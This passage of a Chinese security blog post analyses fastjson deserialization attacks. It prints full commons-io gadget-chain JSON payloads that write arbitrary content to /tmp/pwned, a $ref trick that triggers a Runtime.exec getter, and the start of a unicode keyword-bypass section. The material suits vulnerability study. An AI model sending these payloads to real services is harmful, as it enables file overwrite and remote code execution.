class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;charSequence&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.String&quot;</span><span class="hljs-string">&quot;aaaaaa...(长度要大于8192，实际写入前8192个字符)&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1024</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;branch&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;file&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/tmp/pwned&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;encoding&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;append&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1024</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;writeImmediately&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;trigger&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;is&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;input&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.input&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;branch&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.branch&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;closeBranch&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;httpContentType&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;text/xml&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;lenient&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;defaultEncoding&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;trigger2&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;is&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;input&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.input&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;branch&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.branch&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;closeBranch&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;httpContentType&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;text/xml&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;lenient&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;defaultEncoding&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;trigger3&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;is&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;input&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.input&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;branch&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.branch&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;closeBranch&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;httpContentType&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;text/xml&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;lenient&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;defaultEncoding&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>‍</p><h5 id="commons-io-2-7-2-8-0-版本："><a href="#commons-io-2-7-2-8-0-版本：" class="headerlink" title="commons-io 2.7 - 2.8.0 版本："></a>commons-io 2.7 - 2.8.0 版本：</h5><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;x&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;input&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;charSequence&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.String&quot;</span><span class="hljs-string">&quot;aaaaaa...(长度要大于8192，实际写入前8192个字符)&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;start&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;end&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">2147483647</span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1024</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;branch&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;file&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/tmp/pwned&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;append&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1024</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;writeImmediately&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;trigger&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;inputStream&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;input&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.input&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;branch&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.branch&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;closeBranch&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;httpContentType&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;text/xml&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;lenient&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;defaultEncoding&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;trigger2&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;inputStream&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;input&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.input&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;branch&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.branch&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;closeBranch&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;httpContentType&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;text/xml&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;lenient&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;defaultEncoding&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;trigger3&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;inputStream&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;input&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.input&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;branch&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.branch&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;closeBranch&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>      <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;httpContentType&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;text/xml&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;lenient&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;defaultEncoding&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;UTF-8&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>‍</p><h3 id="C3P0二次序列化-之-hex序列化字节加载器"><a href="#C3P0二次序列化-之-hex序列化字节加载器" class="headerlink" title="C3P0二次序列化 之 hex序列化字节加载器"></a>C3P0二次序列化 之 hex序列化字节加载器</h3><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h2 id="ref"><a href="#ref" class="headerlink" title="$ref"></a>$ref</h2><p>ref是fastjson特有的JSONPath语法，用来引用之前出现的对象</p><p>‍</p><p>因为调用geter是有限制的，对于不满足getter的方法的时候我们该怎么解决呢？当fastjson&gt;&#x3D;1.2.36的时候，可以使用<code>$ref</code>​方式调用getter</p><p>举个例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">private</span> String cmd;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCmd</span><span class="hljs-params">(String cmd)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;seter call&quot;</span>);<br>        <span class="hljs-built_in">this</span>.cmd = cmd;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCmd</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        System.out.println(<span class="hljs-string">&quot;geter call&quot;</span>);<br>        Runtime.getRuntime().exec(cmd);<br>        <span class="hljs-keyword">return</span> cmd;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>‍</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ref_fastjson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;[&#123;\&quot;@type\&quot;:\&quot;org.example.Test\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;,&#123;\&quot;$ref\&quot;:\&quot;$[0].cmd\&quot;&#125;]&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130245.png" alt="image">​</p><p>这其实不就是一个数组吗，fastjson解析到<code>$ref</code>​会判断为是一个引用，<code>$[0]</code>​表示的是数组里的第一个元素，则<code>$[0].cmd</code>​表示的是获取第一个元素的cmd属性的值。</p><p>‍</p><p>进来后并没有处理什么，而是跟进<code>handleResovleTask</code>​ 代码仅仅只是给他赋多了一个属性</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130461.png" alt="image">​</p><p>然后会获取<code>ref</code>​这个key的value，然后吧这两个值作为参数传入<code>JSONPath.eval</code>​中</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130671.png" alt="image">​</p><p>然后将value的值再次eval</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130865.png" alt="image">​</p><p>这里有一个<code>init()</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130048.png" alt="image">​</p><p>跟进后发现不满足条件走了下面代码</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130161.png" alt="image">​</p><p>注意看<code>explain()</code>​函数，这个函数的作用是把$ref的value解析成segment，Segment是定义在JSONPath类的一个interface，然后explain()会把一个完整的JSONPath拆分成小的处理逻辑 最终<code>JSONPath.eval</code>​ 最终会调用到<code>getPropertyValue</code>​ 函数，会尝试调用fieldInfo的get函数或者用反射的方式调用getter</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130293.png" alt="image">​</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h2 id="Fastjson-关键字绕过"><a href="#Fastjson-关键字绕过" class="headerlink" title="Fastjson 关键字绕过"></a>Fastjson 关键字绕过</h2><p>查看 <code>fastjson-1.2.24.jar!\com\alibaba\fastjson\parser\JSONLexerBase.java</code>​</p><p>可以找到 <code>JSONLexerBase.scanSymbol</code>​这个函数是fastjson用来处理json字符串的函数</p><p>也可以发现存在以下特殊代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;u&#x27;</span>:<br>    <span class="hljs-type">char</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.next();<br>    <span class="hljs-type">char</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.next();<br>    <span class="hljs-type">char</span> <span class="hljs-variable">c3</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.next();<br>    <span class="hljs-type">char</span> <span class="hljs-variable">c4</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.next();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> Integer.parseInt(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span 